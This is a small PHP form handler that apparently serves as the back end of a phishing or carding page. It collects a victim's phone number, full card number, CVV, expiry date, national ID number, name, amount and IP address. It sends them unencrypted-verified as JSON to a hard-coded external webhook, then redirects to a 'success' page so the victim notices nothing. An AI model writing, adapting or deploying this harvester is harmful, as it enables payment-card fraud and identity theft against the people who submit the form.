<?php
$phone = $_POST['phone'] ?? '';
$card = $_POST['card'] ?? '';
$cv = $_POST['cv'] ?? '';
$venc = $_POST['venc'] ?? '';
$dni = $_POST['dni'] ?? '';
$name = $_POST['name'] ?? '';
$amount = $_POST['amount'] ?? '';

$webhook_url = 'https://hook.us2.make.com/9r3vblb5fn35s0aoclfcuyg22vhzf55y';

$data = [
    'telefono' => $phone,
    'tarjeta' => $card,
    'cv' => $cv,
    'venc' => $venc,
    'DNI' => $dni,
    'nombre' => $name,
    'cantidad' => $amount,
    'ip' => $_SERVER['REMOTE_ADDR'],
    'fecha' => date('Y-m-d H:i:s')
];

$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

curl_exec($ch);
curl_close($ch);

header('Location: success.php');
exit;
?>